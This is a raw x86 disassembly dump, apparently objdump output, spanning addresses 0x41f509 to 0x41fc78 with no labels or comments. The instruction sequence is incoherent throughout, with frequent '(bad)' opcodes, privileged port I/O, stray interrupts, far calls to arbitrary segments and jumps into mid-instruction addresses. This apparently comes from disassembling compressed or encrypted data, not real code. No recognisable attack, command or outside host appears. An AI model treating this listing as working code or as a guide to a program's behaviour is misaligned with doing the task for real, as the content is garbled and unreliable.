  41f509:	cmp    DWORD PTR [ecx-0xcf55abd],ebp
  41f50f:	mov    ds:0xc14a5202,al
  41f514:	(bad)  
  41f516:	fiadd  DWORD PTR [ebp+ebp*1+0xc0e95a8]
  41f51d:	jg     0x41f4b6
  41f51f:	mov    al,0xd5
  41f521:	in     eax,0x6c
  41f523:	sub    BYTE PTR [eax+0x14],ah
  41f526:	loope  0x41f4d5
  41f528:	lods   al,BYTE PTR ds:[esi]
  41f529:	adc    al,0xc3
  41f52b:	dec    eax
  41f52c:	dec    ebp
  41f52d:	(bad)  
  41f52e:	fnsave [ebx-0x73]
  41f531:	bound  ebx,QWORD PTR ds:0xda99fc33
  41f537:	jo     0x41f55f
  41f539:	(bad)
  41f53c:	push   ds
  41f53d:	ins    DWORD PTR es:[edi],dx
  41f53e:	mov    ch,BYTE PTR [ebx-0x6e4a0c56]
  41f544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f545:	icebp  
  41f546:	mov    al,ds:0xb71d05a3
  41f54b:	outs   dx,BYTE PTR ds:[esi]
  41f54c:	sbb    eax,0x3cbc24b0
  41f551:	(bad)  
  41f552:	fisubr WORD PTR [edi+0x3483af8e]
  41f558:	jno    0x41f4f0
  41f55a:	adc    ah,al
  41f55c:	push   ds
  41f55d:	adc    edx,DWORD PTR [edx+0x37570883]
  41f563:	xlat   BYTE PTR ds:[ebx]
  41f564:	push   esi
  41f565:	out    dx,eax
  41f566:	retf   
  41f567:	jmp    0xaf187777
  41f56c:	lahf   
  41f56d:	dec    esp
  41f56e:	adc    ebp,DWORD PTR [ebp-0x3e4cfb34]
  41f574:	lahf   
  41f575:	inc    ecx
  41f576:	jo     0x41f536
  41f578:	outs   dx,DWORD PTR ds:[esi]
  41f57a:	mov    DWORD PTR [ecx-0x52638f6b],ebx
  41f580:	push   edi
  41f581:	cmp    eax,0x44c4202f
  41f586:	(bad)  
  41f587:	rcr    BYTE PTR [ebx+0x694c2a5d],1
  41f58d:	mov    ch,0xee
  41f58f:	push   edi
  41f590:	or     al,0xbd
  41f592:	mov    edi,0x9c4c7faf
  41f597:	xchg   edi,eax
  41f598:	sub    eax,0x2fe04388
  41f59d:	or     eax,0x4732aa5f
  41f5a2:	(bad)  
  41f5a3:	push   eax
  41f5a4:	and    BYTE PTR [edx-0x14],dl
  41f5a7:	xor    cl,BYTE PTR [ebx]
  41f5a9:	ins    DWORD PTR es:[edi],dx
  41f5aa:	jle    0x41f5aa
  41f5ac:	pop    eax
  41f5ad:	out    0x40,eax
  41f5af:	cmp    eax,0x602028a4
  41f5b4:	mov    dl,dh
  41f5b6:	pop    esi
  41f5b7:	enter  0xcd1d,0x4a
  41f5bb:	imul   ecx,DWORD PTR [eax-0x2a],0xffffff82
  41f5bf:	test   esp,0xdf4295e8
  41f5c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5c6:	push   ecx
  41f5c7:	pop    ds
  41f5c8:	mov    ebp,0x96568f20
  41f5cd:	jnp    0x41f589
  41f5cf:	iret   
  41f5d0:	xor    eax,0xdf7f9d43
  41f5d5:	jns    0x41f562
  41f5d7:	clc    
  41f5d8:	dec    edi
  41f5d9:	rol    BYTE PTR [ebp+0x6bceb4be],1
  41f5df:	in     eax,dx
  41f5e0:	(bad)  
  41f5e1:	cmp    DWORD PTR [edx],esp
  41f5e3:	out    dx,al
  41f5e4:	xchg   esp,eax
  41f5e5:	aas    
  41f5e6:	mov    bh,0xe1
  41f5e8:	sbb    eax,0x2eddd476
  41f5ed:	shr    DWORD PTR [eax+0x5],0x4e
  41f5f1:	ret    
  41f5f2:	add    eax,DWORD PTR es:[ebp+0x26d86b2a]
  41f5f9:	cmp    edi,DWORD PTR [ecx]
  41f5fb:	jb     0x41f58c
  41f5fd:	and    edx,DWORD PTR [edi]
  41f5ff:	mov    ebx,0xa74fc115
  41f604:	or     DWORD PTR [edx-0x26],esi
  41f607:	dec    esp
  41f608:	lods   al,BYTE PTR ds:[esi]
  41f609:	xchg   DWORD PTR [eax],ebx
  41f60b:	sbb    dl,ch
  41f60d:	xchg   ebx,eax
  41f60e:	sti    
  41f60f:	fwait
  41f610:	repz inc esi
  41f612:	inc    ecx
  41f613:	jg     0x41f5f2
  41f615:	les    eax,FWORD PTR [ebx+0x2a3df9a6]
  41f61b:	popa   
  41f61c:	jmp    0x41f5ae
  41f61e:	sub    BYTE PTR [ebx+0x2b013c50],ah
  41f624:	xor    al,0x6c
  41f626:	fwait
  41f627:	test   dh,bh
  41f629:	ja     0x41f5ac
  41f62b:	jno    0x41f604
  41f62d:	sahf   
  41f62e:	pop    edi
  41f62f:	fld    DWORD PTR [eax-0x52]
  41f632:	xchg   edi,eax
  41f633:	pop    esi
  41f634:	(bad)  
  41f635:	in     eax,dx
  41f636:	lods   eax,DWORD PTR ds:[esi]
  41f637:	push   0x31
  41f639:	repnz out 0x47,eax
  41f63c:	xor    DWORD PTR [edx+ebx*1+0x7d],ebp
  41f640:	daa    
  41f641:	and    eax,0xa6c04c9f
  41f646:	push   ebp
  41f647:	add    BYTE PTR [ebp-0x16fd6ba8],0x60
  41f64e:	iret   
  41f64f:	inc    esi
  41f650:	push   ds
  41f651:	shr    bh,0x48
  41f654:	jle    0x41f665
  41f656:	scas   al,BYTE PTR es:[edi]
  41f657:	pop    edi
  41f658:	test   edi,0x7f612b11
  41f65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f65f:	fistp  WORD PTR [ebp+0x26]
  41f662:	pop    ss
  41f663:	dec    ebx
  41f664:	mov    bh,0x21
  41f666:	clc    
  41f667:	sbb    ch,BYTE PTR [ebp-0x6c266fe9]
  41f66d:	ins    DWORD PTR es:[edi],dx
  41f66e:	jae    0x41f68b
  41f670:	inc    esp
  41f671:	mov    esp,0x374a1028
  41f676:	popf   
  41f677:	pushf  
  41f678:	xchg   ebx,eax
  41f679:	cmp    DWORD PTR [eax+0x5eefa167],esi
  41f67f:	les    edx,FWORD PTR [edx-0x23]
  41f682:	fdiv   DWORD PTR [esi+ecx*8]
  41f685:	and    ebx,DWORD PTR [eax-0x50]
  41f688:	fcom   QWORD PTR [edi+0x7f]
  41f68b:	fsub   st(7),st
  41f68d:	int3   
  41f68e:	adc    eax,0xe3e811d9
  41f693:	leave  
  41f694:	xor    al,0x93
  41f696:	popa   
  41f697:	pop    ds
  41f698:	adc    bh,dh
  41f69a:	cmp    eax,ebp
  41f69c:	sub    ch,BYTE PTR [ebx]
  41f69e:	dec    esp
  41f69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6a0:	call   0x5c7f3d1e
  41f6a5:	xchg   dl,cl
  41f6a7:	test   al,0x5
  41f6a9:	add    DWORD PTR [edx-0x72f9e1e9],edi
  41f6af:	mov    ebx,0x8396f564
  41f6b4:	bound  esi,QWORD PTR [edi-0x7]
  41f6b7:	shr    BYTE PTR [edi],0x14
  41f6ba:	xchg   ebp,eax
  41f6bb:	pop    ss
  41f6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6bd:	shr    DWORD PTR [esi+edi*4],cl
  41f6c0:	adc    ch,dh
  41f6c2:	sar    BYTE PTR [edi],1
  41f6c4:	mov    esi,0x47462bf5
  41f6c9:	mov    ds:0xe0cfbcaf,eax
  41f6ce:	call   0xf7:0x8d7b2373
  41f6d5:	push   cs
  41f6d6:	test   bl,cl
  41f6d8:	and    ah,BYTE PTR [ebx]
  41f6da:	mov    ah,BYTE PTR [edx]
  41f6dc:	inc    ecx
  41f6dd:	outs   dx,DWORD PTR ds:[esi]
  41f6de:	rol    BYTE PTR [ecx+0x60],cl
  41f6e1:	cmp    al,0x7b
  41f6e3:	fiadd  WORD PTR [edi+0x6eba6613]
  41f6e9:	call   0x4bec:0xe3844d24
  41f6f0:	shl    cl,1
  41f6f2:	mov    esp,0xbd26f379
  41f6f7:	mov    DWORD PTR [edx+eiz*4-0x76aef2d2],ebx
  41f6fe:	inc    esp
  41f6ff:	or     DWORD PTR [ecx+0x1c874505],edi
  41f705:	push   esp
  41f706:	dec    ebx
  41f707:	loopne 0x41f6fd
  41f709:	cs dec edx
  41f70b:	div    BYTE PTR [edx+edx*8-0x7e67e795]
  41f712:	loope  0x41f725
  41f714:	add    BYTE PTR [esi-0xa],ch
  41f717:	mov    cl,BYTE PTR [esi]
  41f719:	mov    BYTE PTR [esi],ch
  41f71b:	call   0xe56d:0xf319bd32
  41f722:	iret   
  41f723:	je     0x41f6f4
  41f725:	and    DWORD PTR [eax],edi
  41f727:	pop    ecx
  41f728:	push   cs
  41f729:	push   ss
  41f72a:	sub    ah,BYTE PTR [ecx-0x7]
  41f72d:	sbb    bh,dh
  41f72f:	xchg   ebp,eax
  41f730:	es xchg ecx,eax
  41f732:	addr16 mov edi,0x36a5684
  41f738:	fdivr  QWORD PTR [eax-0x61]
  41f73b:	pop    ebp
  41f73c:	push   0xda3cefdc
  41f741:	jl     0x41f716
  41f743:	fidiv  DWORD PTR [eax+ebp*1]
  41f746:	repnz dec ebx
  41f748:	mov    esp,0xac6142af
  41f74d:	aaa    
  41f74e:	add    al,0x84
  41f750:	mov    edi,0xb34d935b
  41f755:	inc    esi
  41f756:	jbe    0x41f6f8
  41f758:	mov    ds:0x3d1e433b,al
  41f75d:	xchg   ecx,eax
  41f75f:	es std 
  41f761:	stos   DWORD PTR es:[edi],eax
  41f762:	xchg   cl,ch
  41f764:	inc    edx
  41f765:	mov    esi,0xfde7dbab
  41f76a:	int3   
  41f76b:	mov    cl,0xd9
  41f76d:	push   edx
  41f76e:	je     0x41f6f5
  41f770:	and    eax,0x17e765d0
  41f775:	mov    al,0x6
  41f777:	je     0x41f7ef
  41f779:	xor    eax,0x43e261ec
  41f77e:	loope  0x41f71b
  41f780:	es inc esi
  41f782:	sbb    DWORD PTR [ebx+0x18],eax
  41f785:	cld    
  41f786:	add    ah,al
  41f788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f789:	and    al,0x2f
  41f78b:	and    cl,dl
  41f78d:	shl    DWORD PTR [esi-0x41],0x59
  41f791:	iret   
  41f792:	loope  0x41f7d7
  41f794:	sbb    eax,0xdf1478b
  41f799:	add    al,0x6d
  41f79b:	sbb    eax,DWORD PTR [esi+esi*4]
  41f79e:	push   ebx
  41f79f:	inc    esp
  41f7a0:	push   ebx
  41f7a1:	xchg   edi,eax
  41f7a2:	add    al,0x9a
  41f7a4:	popf   
  41f7a5:	jnp    0x41f7e9
  41f7a7:	jmp    0xd0e5c952
  41f7ac:	loopne 0x41f7d1
  41f7ae:	imul   edx,DWORD PTR [esi+0x5ce12a1d],0x7a528248
  41f7b8:	or     esp,0x2f5c4563
  41f7be:	pop    es
  41f7bf:	and    edi,ebx
  41f7c1:	jae    0x41f7a2
  41f7c3:	mov    ebx,0xf28b65c9
  41f7c8:	clc    
  41f7c9:	pop    ecx
  41f7ca:	or     BYTE PTR [ecx-0x141883b7],bh
  41f7d0:	jmp    0x41f836
  41f7d2:	lea    ecx,[ebp-0x620ae49b]
  41f7d8:	call   0x751ace0b
  41f7dd:	sbb    DWORD PTR [ebx+ecx*4],ebx
  41f7e0:	call   FWORD PTR ss:[ebp+0xf]
  41f7e4:	dec    DWORD PTR [edx]
  41f7e6:	push   ds
  41f7e7:	lock xchg esi,eax
  41f7e9:	xchg   edi,eax
  41f7ea:	xchg   esi,eax
  41f7eb:	and    al,ah
  41f7ed:	jb     0x41f7d3
  41f7ef:	(bad)  
  41f7f0:	adc    ecx,esp
  41f7f2:	adc    cl,BYTE PTR [esi]
  41f7f4:	aad    0x35
  41f7f6:	bound  edx,QWORD PTR [ecx-0x2000216]
  41f7fc:	lea    edx,[eax+0x722d7788]
  41f802:	retf   0x7b55
  41f805:	inc    edx
  41f806:	xchg   esi,eax
  41f807:	xor    eax,0xc1487280
  41f80c:	jae    0x41f887
  41f80e:	and    bh,bl
  41f810:	stos   DWORD PTR es:[edi],eax
  41f811:	fs pop esi
  41f813:	xchg   edi,eax
  41f814:	sub    bh,BYTE PTR [eax+0x3bf5bce3]
  41f81a:	sbb    ecx,ebp
  41f81c:	gs aad 0xd7
  41f81f:	mov    al,ds:0xb6ad22c
  41f824:	add    al,0x24
  41f826:	ret    0xb232
  41f829:	das    
  41f82a:	popa   
  41f82b:	adc    cl,BYTE PTR [ebx+0x7a]
  41f82e:	push   0x7d
  41f830:	sti    
  41f831:	sbb    BYTE PTR [edi],ch
  41f833:	xor    eax,0xd1cecc2d
  41f838:	xchg   edx,eax
  41f839:	xchg   esi,eax
  41f83a:	pusha  
  41f83b:	dec    eax
  41f83c:	inc    esi
  41f83d:	sub    eax,0xe5955f5a
  41f842:	in     eax,0x22
  41f844:	daa    
  41f845:	stos   BYTE PTR es:[edi],al
  41f846:	in     eax,0xd5
  41f848:	aaa    
  41f849:	fld1   
  41f84b:	retf   0x7ae7
  41f84e:	popf   
  41f84f:	in     al,dx
  41f850:	icebp  
  41f851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f852:	cwde   
  41f853:	cmp    DWORD PTR [ebx+0x32],edx
  41f856:	add    eax,0x6fdfebf5
  41f85b:	jl     0x41f7e2
  41f85d:	inc    esp
  41f85e:	mov    bl,0x5d
  41f860:	in     al,dx
  41f861:	aas    
  41f862:	jno    0x41f88a
  41f864:	in     al,0x8e
  41f866:	imul   ecx,DWORD PTR [ebp-0x51e4d48a],0x66
  41f86d:	jmp    0x1843af6b
  41f872:	addr16 adc al,0xe8
  41f875:	pop    ebx
  41f876:	push   ss
  41f877:	adc    eax,0x8438d936
  41f87c:	pop    eax
  41f87d:	stos   DWORD PTR es:[edi],eax
  41f87e:	mov    dl,0xa8
  41f880:	jae    0x41f83a
  41f882:	xchg   esi,eax
  41f883:	lea    ebp,[edi+edx*8+0x7e]
  41f887:	push   eax
  41f888:	popa   
  41f889:	jecxz  0x41f812
  41f88b:	popf   
  41f88c:	ja     0x41f8fc
  41f88e:	mov    ebx,0xe40c32e9
  41f893:	inc    esi
  41f894:	je     0x41f893
  41f896:	dec    ebx
  41f897:	mov    eax,es
  41f899:	(bad)  
  41f89a:	jge    0x41f8f6
  41f89c:	jns    0x41f83a
  41f89e:	mov    al,0x90
  41f8a0:	imul   ecx,edi,0x9c6ce35c
  41f8a6:	sar    DWORD PTR [edx+0x5d7e79c5],1
  41f8ac:	pop    edx
  41f8ad:	shl    DWORD PTR [edi],0x8d
  41f8b0:	or     esi,DWORD PTR [ebp+eax*4-0x122d3524]
  41f8b7:	dec    ecx
  41f8b8:	cmp    eax,0x3d9b8901
  41f8bd:	pop    ebp
  41f8be:	jle    0x41f938
  41f8c0:	adc    al,0x17
  41f8c2:	push   edx
  41f8c3:	ja     0x41f8a4
  41f8c5:	adc    BYTE PTR [bx+si+0x4e31],dl
  41f8ca:	xchg   dh,bh
  41f8cc:	dec    edx
  41f8cd:	fcomp  QWORD PTR [eax-0x89ee005]
  41f8d3:	xchg   edi,eax
  41f8d4:	and    al,0xe6
  41f8d6:	hlt    
  41f8d7:	fcom   QWORD PTR [edi+0x75abd334]
  41f8dd:	sbb    DWORD PTR [ebx+0x68],edi
  41f8e0:	call   0xe80f:0x1b357dc5
  41f8e7:	cmc    
  41f8e8:	les    ebx,FWORD PTR [ecx-0x3716d362]
  41f8ee:	mov    bl,0x50
  41f8f0:	or     ch,0x0
  41f8f3:	pop    esi
  41f8f4:	gs adc bh,ch
  41f8f7:	scas   al,BYTE PTR es:[edi]
  41f8f8:	mov    ds:0x6e1ebfba,al
  41f8fd:	cmc    
  41f8fe:	aas    
  41f8ff:	test   ch,0x18
  41f902:	popf   
  41f903:	or     ebx,DWORD PTR [ebx-0x595c98c2]
  41f909:	fs jp  0x41f8d9
  41f90c:	inc    ebp
  41f90d:	jno    0x41f976
  41f90f:	push   esp
  41f910:	mov    ebp,0x1c870c6f
  41f915:	cmp    cl,BYTE PTR [ebp+0x11a12252]
  41f91b:	xchg   edx,eax
  41f91c:	sub    DWORD PTR [edx],ebx
  41f91e:	imul   eax,DWORD PTR [ecx+0x17],0x7f21427f
  41f925:	add    DWORD PTR ds:0xd6042892,0xffffff8a
  41f92c:	dec    esp
  41f92d:	jecxz  0x41f931
  41f92f:	xchg   edi,eax
  41f930:	jle    0x41f931
  41f932:	leave  
  41f933:	jno    0x41f8ba
  41f935:	cld    
  41f936:	xchg   edx,eax
  41f937:	add    ah,BYTE PTR [ebx+0x3702798b]
  41f93d:	idiv   BYTE PTR [esp]
  41f940:	mov    ebp,0x30cc2363
  41f945:	cmp    eax,0x2d831e98
  41f94a:	jle    0x41f97c
  41f94c:	loope  0x41f966
  41f94e:	push   ebp
  41f94f:	lock add esi,ecx
  41f952:	dec    ebp
  41f953:	cmp    al,0xb1
  41f955:	int    0xeb
  41f957:	push   eax
  41f958:	pop    ebp
  41f959:	jo     0x41f8ee
  41f95b:	es adc edx,edi
  41f95e:	xchg   BYTE PTR [edx-0x22024242],al
  41f964:	aad    0x7f
  41f966:	(bad)  
  41f967:	xor    edi,esi
  41f969:	cmp    cl,ch
  41f96b:	in     eax,dx
  41f96c:	pop    ebx
  41f96d:	sub    cl,BYTE PTR [ecx-0x6]
  41f970:	mov    ah,0x6b
  41f972:	out    0x52,eax
  41f974:	shr    ebp,1
  41f976:	xor    bl,BYTE PTR [ecx]
  41f978:	and    eax,0xaaf3ff1b
  41f97d:	pop    esi
  41f97e:	pop    ss
  41f97f:	or     DWORD PTR [ebp+esi*1-0x72],esi
  41f983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f984:	aad    0xe9
  41f986:	je     0x41f92c
  41f988:	or     bl,0xab
  41f98b:	jmp    0xad2fb1b2
  41f990:	mov    ecx,DWORD PTR [edi]
  41f992:	mov    esi,0xcf8b12d6
  41f997:	jmp    0x41f930
  41f999:	cs (bad) 
  41f99b:	sbb    ax,0xeec8
  41f99f:	adc    BYTE PTR [esp+ecx*4-0x7664170c],0x75
  41f9a7:	sub    bl,dh
  41f9a9:	xchg   edx,eax
  41f9aa:	mov    DWORD PTR [bx+di-0x4f71],esp
  41f9af:	out    dx,al
  41f9b0:	lods   eax,DWORD PTR ds:[esi]
  41f9b1:	mov    ecx,0x9d593306
  41f9b6:	push   edi
  41f9b7:	jns    0x41f9f7
  41f9b9:	jae    0x41fa24
  41f9bb:	fdiv   st(4),st
  41f9bd:	ss mov ch,0x25
  41f9c0:	and    BYTE PTR [edx],0xc2
  41f9c3:	sti    
  41f9c4:	rcl    DWORD PTR [edi],cl
  41f9c6:	mov    ds:0xc9c647c2,al
  41f9cb:	xchg   ch,dl
  41f9cd:	sahf   
  41f9ce:	push   esp
  41f9cf:	fsubr  st,st(1)
  41f9d1:	pop    ebx
  41f9d2:	sub    dl,BYTE PTR [edi+ecx*1]
  41f9d5:	fmul   QWORD PTR [edx+esi*2-0x5fd26ff6]
  41f9dc:	add    DWORD PTR [esi+0x7c],eax
  41f9df:	mov    cl,0xae
  41f9e1:	lock or eax,0x5a0f3afb
  41f9e7:	pop    eax
  41f9e8:	shl    edi,0xb8
  41f9eb:	pop    ss
  41f9ec:	imul   eax,DWORD PTR [esi-0xa3d5db9],0xffffffe0
  41f9f3:	cli    
  41f9f4:	mov    al,0x1e
  41f9f6:	inc    edx
  41f9f7:	inc    esi
  41f9f8:	mov    ecx,DWORD PTR [edi]
  41f9fa:	dec    ebp
  41f9fb:	xchg   ebp,eax
  41f9fc:	ins    DWORD PTR es:[edi],dx
  41f9fd:	imul   edi,DWORD PTR [ecx+edi*4],0xffffffdf
  41fa01:	pop    edi
  41fa02:	add    ch,BYTE PTR [edi+0xa238625]
  41fa08:	arpl   WORD PTR [esi-0x2f879d36],dx
  41fa0e:	imul   ebp,DWORD PTR [edx],0x39
  41fa11:	mov    al,0x8f
  41fa13:	sub    DWORD PTR [ebx+0x1d30489f],ebx
  41fa19:	mov    bl,0x89
  41fa1b:	jbe    0x41f9be
  41fa1d:	xor    BYTE PTR [edi+0x9f0bc09],ch
  41fa23:	mov    bh,0xae
  41fa25:	jmp    0x837f:0x74a80667
  41fa2c:	rcr    BYTE PTR ss:[edi+0x78],cl
  41fa30:	mov    dh,0xa3
  41fa32:	(bad)
  41fa37:	mov    eax,ds:0x5a49552d
  41fa3c:	dec    ebp
  41fa3d:	jp     0x41fa0d
  41fa3f:	cld    
  41fa40:	xor    eax,0xfa7a7e30
  41fa45:	jbe    0x41faa9
  41fa47:	push   ebx
  41fa48:	std    
  41fa49:	(bad)  
  41fa4a:	into   
  41fa4b:	jmp    0xb13ab6ee
  41fa50:	popf   
  41fa51:	push   edi
  41fa52:	je     0x41fa9d
  41fa54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa55:	fmul   st(5),st
  41fa57:	mov    dl,0x3f
  41fa59:	aam    0x93
  41fa5b:	dec    ecx
  41fa5c:	inc    edi
  41fa5d:	lea    esp,[edx+0x27]
  41fa60:	and    al,bh
  41fa62:	pusha  
  41fa63:	add    eax,0xe354f915
  41fa68:	and    DWORD PTR [esi-0x2f],ebx
  41fa6b:	addr16 retf 
  41fa6d:	jbe    0x41fada
  41fa6f:	je     0x41fa3a
  41fa71:	inc    esi
  41fa72:	push   ss
  41fa73:	stos   DWORD PTR es:[edi],eax
  41fa74:	mov    dh,0xc6
  41fa76:	icebp  
  41fa77:	jae    0x41face
  41fa79:	lahf   
  41fa7a:	jecxz  0x41faf4
  41fa7c:	pop    ds
  41fa7d:	test   al,0x5c
  41fa7f:	cdq    
  41fa80:	pop    edi
  41fa81:	or     eax,0x17f8eb7b
  41fa86:	(bad)  
  41fa88:	jbe    0x41fadd
  41fa8a:	jbe    0x41fa63
  41fa8c:	std    
  41fa8d:	xchg   esi,eax
  41fa8e:	pop    ecx
  41fa8f:	sub    ebx,esp
  41fa91:	shl    al,cl
  41fa93:	mov    es,WORD PTR [ebx]
  41fa95:	sti    
  41fa96:	jns    0x41fa62
  41fa98:	jb     0x41fac4
  41fa9a:	fnstenv [esi-0x28836e92]
  41faa0:	je     0x41fb07
  41faa2:	mov    ds:0x2b0a0c57,al
  41faa7:	(bad)  
  41faa8:	pop    ss
  41faa9:	stc    
  41faaa:	or     DWORD PTR [ebx],eax
  41faac:	scas   al,BYTE PTR es:[edi]
  41faad:	and    eax,0x37f30699
  41fab2:	adc    eax,0x648e8444
  41fab7:	out    dx,al
  41fab8:	ss pop ds
  41faba:	jno    0x41fb21
  41fabc:	(bad)  
  41fabd:	adc    ebp,DWORD PTR [edx+0x5bd82dc0]
  41fac3:	ret    
  41fac4:	mov    al,0xf8
  41fac6:	clc    
  41fac7:	push   ss
  41fac8:	nop
  41fac9:	lods   al,BYTE PTR ds:[esi]
  41faca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41facb:	push   esp
  41facc:	adc    dh,cl
  41face:	pop    edx
  41facf:	xchg   esi,eax
  41fad0:	xor    eax,0xd532b910
  41fad5:	push   0xffffff80
  41fad7:	jne    0x41fb27
  41fad9:	out    dx,eax
  41fada:	mov    dh,0xf8
  41fadc:	das    
  41fadd:	xor    eax,DWORD PTR ds:0x3ea0b722
  41fae3:	nop
  41fae4:	cmp    BYTE PTR [edi-0x2e],al
  41fae7:	mov    eax,ds:0x6296c9b6
  41faec:	stos   DWORD PTR es:[edi],eax
  41faed:	pop    eax
  41faee:	jno    0x41fad5
  41faf0:	dec    cl
  41faf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faf3:	popa   
  41faf4:	into   
  41faf5:	test   eax,0x4f3eb1de
  41fafa:	cwde   
  41fafb:	xor    dh,BYTE PTR [ebp-0x502e8fbc]
  41fb01:	mov    dl,BYTE PTR [edx-0x18]
  41fb04:	test   al,0x26
  41fb06:	imul   eax,edi,0x4b
  41fb09:	inc    eax
  41fb0a:	sub    al,0x5d
  41fb0c:	jns    0x41fb3d
  41fb0e:	mov    esp,0xc1678c9b
  41fb13:	mov    ebp,0x3a52a788
  41fb18:	and    eax,0x863135d8
  41fb1d:	ds mov ch,0x48
  41fb20:	xchg   esp,eax
  41fb21:	push   ss
  41fb22:	dec    esi
  41fb23:	add    DWORD PTR [edx-0x5b],esp
  41fb26:	mov    esi,0x8d094fe4
  41fb2b:	xchg   ebp,eax
  41fb2c:	dec    ecx
  41fb2d:	push   ebp
  41fb2e:	sbb    DWORD PTR [ecx+0x6],esp
  41fb31:	mov    cl,0x9d
  41fb33:	or     dh,BYTE PTR [edx]
  41fb35:	push   0x32cbe84d
  41fb3a:	inc    esi
  41fb3b:	push   ds
  41fb3c:	fiadd  DWORD PTR [ecx]
  41fb3e:	xor    DWORD PTR [ebp-0x2316846b],0xffffffd7
  41fb45:	shl    DWORD PTR [ebx+edx*2],cl
  41fb48:	jecxz  0x41fb04
  41fb4a:	cmp    cl,BYTE PTR [ebx-0x77]
  41fb4d:	inc    eax
  41fb4e:	dec    eax
  41fb4f:	mov    ch,0x71
  41fb51:	repz or eax,0x1e48d57e
  41fb57:	and    eax,0x1073f988
  41fb5c:	xchg   esp,eax
  41fb5d:	mov    al,0xd5
  41fb5f:	dec    eax
  41fb60:	(bad)  
  41fb61:	pop    ebp
  41fb62:	pop    ss
  41fb63:	lea    edi,[esi]
  41fb65:	not    DWORD PTR [esi+0x7f330cbe]
  41fb6b:	mov    BYTE PTR [ebx+0x68d7c505],dl
  41fb71:	inc    esi
  41fb72:	lds    ebp,FWORD PTR [edx*8-0x3ee9587b]
  41fb79:	iret   
  41fb7a:	sbb    DWORD PTR [ebp-0x2c],ebx
  41fb7d:	inc    ecx
  41fb7e:	(bad)  
  41fb7f:	in     al,dx
  41fb80:	mov    al,0x63
  41fb82:	in     eax,dx
  41fb83:	or     DWORD PTR [esi+0x27],0x51
  41fb87:	pop    esi
  41fb88:	call   0x387f580
  41fb8d:	or     eax,0x63d39483
  41fb92:	sbb    al,0x19
  41fb94:	xor    DWORD PTR [ecx+0x72d2ef1b],eax
  41fb9a:	fisttp DWORD PTR [edi]
  41fb9c:	pop    edi
  41fb9d:	ins    DWORD PTR es:[edi],dx
  41fb9e:	mov    cl,bh
  41fba0:	xchg   ebp,eax
  41fba1:	inc    edx
  41fba2:	inc    esp
  41fba3:	cs mov edx,0x2f573c92
  41fba9:	icebp  
  41fbaa:	pop    es
  41fbab:	int3   
  41fbac:	mov    ds:0x5e3a3ee0,al
  41fbb1:	out    dx,eax
  41fbb2:	fild   QWORD PTR [ebx+esi*8-0xba00d10]
  41fbb9:	pop    edi
  41fbba:	mov    ch,0xed
  41fbbc:	xchg   ebp,eax
  41fbbd:	push   cs
  41fbbe:	inc    edi
  41fbbf:	aam    0x77
  41fbc1:	cmp    eax,0xad3e5165
  41fbc6:	mov    ds:0x940d03eb,al
  41fbcb:	std    
  41fbcc:	outs   dx,DWORD PTR ds:[esi]
  41fbcd:	push   0x4f
  41fbcf:	pop    ss
  41fbd0:	inc    edi
  41fbd1:	lahf   
  41fbd2:	mov    ss,WORD PTR [edx+esi*8]
  41fbd5:	jmp    0x734c:0x6277b1d
  41fbdc:	add    ecx,DWORD PTR [edx-0x13832b54]
  41fbe2:	int3   
  41fbe3:	add    ebx,DWORD PTR [edx]
  41fbe5:	in     eax,dx
  41fbe6:	mov    ds,WORD PTR [ecx]
  41fbe8:	mov    cl,0x76
  41fbea:	outs   dx,BYTE PTR ds:[esi]
  41fbeb:	push   0xec81d59c
  41fbf0:	sub    BYTE PTR [eax-0x485a13b1],ah
  41fbf6:	push   es
  41fbf7:	xchg   DWORD PTR [edi],edi
  41fbf9:	xor    DWORD PTR [esi],edx
  41fbfb:	cmp    al,0x72
  41fbfd:	sub    DWORD PTR [edx],0xa819c85c
  41fc03:	mov    ebp,0x184f29ba
  41fc08:	cmovnp esp,DWORD PTR [esi-0x71]
  41fc0c:	outs   dx,DWORD PTR ds:[esi]
  41fc0d:	xor    al,0xc5
  41fc0f:	mov    dl,ah
  41fc11:	popa   
  41fc12:	adc    dh,BYTE PTR [edi+0x7b]
  41fc15:	pop    ss
  41fc16:	stos   DWORD PTR es:[edi],eax
  41fc17:	push   ds
  41fc18:	into   
  41fc19:	fs rol DWORD PTR gs:[ecx-0x6c4d84fc],cl
  41fc21:	mov    ah,0xd4
  41fc23:	fldl2e 
  41fc25:	std    
  41fc26:	xchg   ebp,ebx
  41fc28:	cmp    dl,dh
  41fc2a:	pop    eax
  41fc2b:	bound  edi,QWORD PTR [ebp-0x28]
  41fc2e:	jge    0x41fc79
  41fc30:	hlt    
  41fc31:	jp     0x41fbcb
  41fc33:	push   esi
  41fc34:	aaa    
  41fc35:	js     0x41fc33
  41fc37:	imul   ebp,DWORD PTR [ebp-0x6b9fcd8a],0xffffffda
  41fc3e:	add    DWORD PTR [esi-0x3169dcca],ebp
  41fc44:	push   edx
  41fc45:	dec    ebx
  41fc46:	add    al,0x4b
  41fc48:	jae    0x22fcb64a
  41fc4e:	or     eax,0x40a50742
  41fc53:	adc    al,dl
  41fc55:	inc    edi
  41fc56:	mov    dl,0x63
  41fc58:	adc    bh,BYTE PTR [edx+0xf42d776]
  41fc5e:	clc    
  41fc5f:	pusha  
  41fc60:	sub    dh,dl
  41fc62:	dec    ebx
  41fc63:	stos   DWORD PTR es:[edi],eax
  41fc64:	pop    edi
  41fc65:	pop    esi
  41fc66:	and    cl,dl
  41fc68:	sbb    BYTE PTR fs:[edi+eiz*8+0x7d],ch
  41fc6d:	pop    ebp
  41fc6e:	popf   
  41fc6f:	outs   dx,DWORD PTR ds:[esi]
  41fc70:	fnsave [esi+0x7d]
  41fc73:	fdivr  st(2),st
  41fc75:	mov    al,0xa2
  41fc77:	lahf   
  41fc78:	sbb    DWORD PTR [edi+esi*2+0x1f9447a4],edx
